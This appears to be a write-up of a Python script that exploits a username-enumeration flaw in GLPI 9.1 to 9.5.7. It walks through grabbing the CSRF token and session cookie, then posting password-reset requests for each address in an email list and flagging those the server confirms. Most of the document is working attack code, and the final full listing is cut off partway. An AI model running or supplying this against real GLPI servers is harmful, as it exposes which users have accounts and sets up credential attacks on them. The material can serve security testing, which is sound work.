- This script is designed to test for a vulnerability in GLPI version 9.1 to 9.5.7 that allows an attacker to enumerate valid usernames via the password reset functionality.
   
  

<u>Step-by-step explanation:</u>

1. First, the script sends a GET request to the password reset page to obtain the CSRF token and session cookie.
        ```python
        response = requests.get('http://127.0.0.1:80/glpi/front/lostpassword.php?lostpassword=1')
        ```
2. Using the BeautifulSoup library, the script parses the HTML response to extract the CSRF token.
   ```py
        soup = BeautifulSoup(response.content, 'html.parser')
csrf_input = soup.find('input', {'name': lambda n: n and n.startswith('_glpi_csrf_')})
if csrf_input:
    csrf_token = csrf_input['value']

   ```
3. The script then reads a list of email addresses from a text file and loops through them to make a POST request to the password reset page for each email.
```py
        with open('emails.txt', 'r') as f:
    email_list = f.readlines()

for email in email_list:
    email = email.strip()
    data = {"email": email, "update": "Save", "_glpi_csrf_token": csrf_token}
    cookies = {"glpi_f6478bf118ca2449e9e40b198bd46afe": session_cookie_value}
    freq = requests.post(url, headers=headers, cookies=cookies, data=data)

```
4. Finally, the script parses the response from each POST request and checks if the message indicates a valid email address was found.
   ``` python
    soup = BeautifulSoup(freq.content, 'html.parser')
    div_center = soup.find('div', {'class': 'center'})
    Result = (f"Email: {email}, Result: {div_center.text.strip()}")
    if "An email has been sent to your email address. The email contains information for reset your password." in Result:
        print ("\033[1;32m Email Found! -> " + Result)

    ```

**Code block:**

```python

    import requests
    from bs4 import BeautifulSoup

    # Send a GET request to the page to receive the csrf token and the cookie session
    response = requests.get('http://127.0.0.1:80/glpi/front/lostpassword.php?lostpassword=1')

    # Parse the HTML using BeautifulSoup
    soup = BeautifulSoup(response.content, 'html.parser')

    # Find the input element with the CSRF token
    csrf_input = soup.find('input', {'name': lambda n: n and n.startswith('_glpi_csrf_')})

    # Extract the CSRF token if it exists
    if csrf_input:
        csrf_token = csrf_input['value']

    # Extract the session cookie
    session_cookie_value = None
    if response.cookies:
        session_cookie_value = next(iter(response.cookies.values()))

    # Set the custom url where the GLPI recover password is located 
    url = "http://127.0.0.1:80/glpi/front/lostpassword.php"

    # Set the headers for the POST request
    
    ```